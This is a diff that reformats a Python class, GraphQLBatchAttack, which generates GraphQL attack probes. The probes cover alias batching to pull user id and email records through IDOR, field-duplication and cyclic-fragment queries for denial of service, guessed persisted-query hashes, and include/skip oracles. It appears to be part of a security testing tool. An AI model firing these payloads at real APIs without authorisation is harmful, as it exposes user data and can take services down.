@@ -103,15 +103,15 @@ class GraphQLBatchAttack:
         endpoint has no per-row authorisation, the response will
         include the requested user records, exposing an IDOR.
         """
-        ids = list(sample_ids) if sample_ids is not None else [
-            str(i) for i in range(1, max_aliases + 1)
-        ]
+        ids = (
+            list(sample_ids)
+            if sample_ids is not None
+            else [str(i) for i in range(1, max_aliases + 1)]
+        )
         aliases: list[str] = []
         for i, uid in enumerate(ids[:max_aliases]):
             arg = arg_template % uid
-            aliases.append(
-                f"  a{i}: {field}{arg} {{ id email }}"
-            )
+            aliases.append(f"  a{i}: {field}{arg} {{ id email }}")
         query = "query AliasBatch {\n" + "\n".join(aliases) + "\n}"
         return GraphQLProbe(
             label="graphql-alias-batching",
@@ -130,8 +130,11 @@ class GraphQLBatchAttack:
         down dramatically (timing oracle) or hit query-cost limits
         (cost-amplification DoS).
         """
-        body = "  f0: " + field + " { id }\n" + "".join(
-            f"  f{i}: {field} {{ id }}\n" for i in range(1, count)
+        body = (
+            "  f0: "
+            + field
+            + " { id }\n"
+            + "".join(f"  f{i}: {field} {{ id }}\n" for i in range(1, count))
         )
         return GraphQLProbe(
             label="graphql-field-duplication",
@@ -150,7 +153,7 @@ class GraphQLBatchAttack:
         # Build the cycle in reverse so the top of the query reads naturally.
         body = ["fragment frA on Query { ...frB }", "fragment frB on Query { ...frA }"]
         for i in range(depth - 2):
-            body.append(f"fragment frA{i} on Query {{ ...frA{i+1} }}")
+            body.append(f"fragment frA{i} on Query {{ ...frA{i + 1} }}")
             body.append(f"fragment frB{i} on Query {{ ...frA{i} }}")
         return GraphQLProbe(
             label="graphql-fragment-cycle-dos",
@@ -169,17 +172,19 @@ class GraphQLBatchAttack:
         probes: list[GraphQLProbe] = []
         for i in range(attempts):
             short_id = "".join(random.choices("0123456789abcdef", k=8))
-            probes.append(GraphQLProbe(
-                label=f"graphql-persisted-query-{i}",
-                query="",
-                extensions={
-                    "persistedQuery": {
-                        "version": 1,
-                        "sha256Hash": short_id,
-                    }
-                },
-                expected_anomaly="Persisted query lookup by guessed short hash succeeded",
-            ))
+            probes.append(
+                GraphQLProbe(
+                    label=f"graphql-persisted-query-{i}",
+                    query="",
+                    extensions={
+                        "persistedQuery": {
+                            "version": 1,
+                            "sha256Hash": short_id,
+                        }
+                    },
+                    expected_anomaly="Persisted query lookup by guessed short hash succeeded",
+                )
+            )
         return probes
 
     def include_skip_oracle(
@@ -199,7 +204,7 @@ class GraphQLBatchAttack:
                 label="graphql-include-skip-on",
                 query=(
                     "query Inc($on: Boolean!) {\n"
-                    f"  target: {field}(id: \"{record_id}\") @include(if: $on) {{ id email }}\n"
+                    f'  target: {field}(id: "{record_id}") @include(if: $on) {{ id email }}\n'
                     "}"
                 ),
                 variables={"on": True},
@@ -208,7 +213,7 @@ class GraphQLBatchAttack:
                 label="graphql-include-skip-off",
                 query=(
                     "query Inc($on: Boolean!) {\n"
-                    f"  target: {field}(id: \"{record_id}\") @include(if: $on) {{ id email }}\n"
+                    f'  target: {field}(id: "{record_id}") @include(if: $on) {{ id email }}\n'
                     "}"
                 ),
                 variables={"on": False},
